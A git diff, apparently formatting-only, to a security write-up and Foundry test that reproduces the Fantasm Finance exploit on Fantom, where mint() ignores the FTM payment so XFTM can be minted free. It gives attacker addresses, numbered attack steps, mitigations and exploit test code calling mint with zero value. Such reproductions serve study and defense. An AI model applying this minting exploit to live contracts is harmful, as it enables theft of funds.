@@ -22,7 +22,7 @@ https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f
 Exploited Contract: 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156
 Attacker Address: https://ftmscan.com/address/0x47091e015b294b935babda2d28ad44e3ab07ae8d
 Attacker Contract: https://ftmscan.com/address/0x944b58c9b3b49487005cead0ac5d71c857749e3e
-Attack Block: 32968740 
+Attack Block: 32968740
 
 // Key Info Sources
 Twitter: https://twitter.com/fantasm_finance/status/1501569232881995785
@@ -59,7 +59,7 @@ Principle: Unchecked payment amount for minted tokens.
         if (_ftmFee > 0) {
             WethUtils.transfer(feeReserve, _ftmFee);
         }
-        
+
         emit Mint(_minter, _xftmOut, _ftmIn, _fantasmIn, _ftmFee);
     }
 
@@ -92,10 +92,10 @@ _fee = (_fantasmIn * _fantasmPrice * collateralRatio * mintingFee) / PRECISION /
 collateralRatio) / PRICE_PRECISION;
         }
     }
-    
+
 ATTACK:
 0) Deploy a contract the performed the following actions:
-1) The attacker minted XFTM with pool.mint{value: 0}(someFSM, 0) 
+1) The attacker minted XFTM with pool.mint{value: 0}(someFSM, 0)
 2) Collected the XFTMs
 3) Swapped XFTMs to FTM
 4) Back to step 1.
@@ -104,7 +104,7 @@ This was possible because the _minFtmIn return of calcMint() (minimum amount of 
 consumed by the mint() function:
 (uint256 _xftmOut, SHOULD BE HERE , uint256 _minFantasmIn, uint256 _ftmFee) = calcMint(_ftmIn, _fantasmIn);
 
-Essentially, minting tokens for free. 
+Essentially, minting tokens for free.
 
 MITIGATIONS:
 1) If tokens are minted in exchange of a counterpart, check that the counterpart is sucessfully transferred to
@@ -125,7 +125,7 @@ contract Exploit_FantasmFinance is TestHarness, TokenBalanceTracker {
     uint256 internal constant ATTACKER_INITIAL_BALANCE = 282_788_864_964_253_879_669;
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 32972106);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 32_972_106);
 
         cheat.prank(FANTOM_DEPLOYER); // Simulating initial attacker's balance
         fsm.transfer(address(this), ATTACKER_INITIAL_BALANCE); // https://ftmscan.com/tx/0xdfe2357a2105acaf36ffb54f1973d33460fa9160f8c4b12453bd1c5bcdab9560
@@ -145,11 +145,11 @@ contract Exploit_FantasmFinance is TestHarness, TokenBalanceTracker {
     function test_attack() external {
         fsm.approve(address(fantasmPool), type(uint256).max);
         fantasmPool.mint{value: 0}(fsm.balanceOf(address(this)), 0); // Passing 0 as _minXftmOut, msg.value ==
-            // 0;
-            // https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82
+        // 0;
+        // https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82
         cheat.roll(32_972_130); // Jump one block before collection
         fantasmPool.collect(); // Collect tx
-            // https://ftmscan.com/tx/0x956e760143d3a029ae44fa2b60e8a7613ed937374b7e473109e3193e466f523a
+        // https://ftmscan.com/tx/0x956e760143d3a029ae44fa2b60e8a7613ed937374b7e473109e3193e466f523a
 
         console.log("After exploit");
         logBalancesWithLabel("Attacker", address(this));
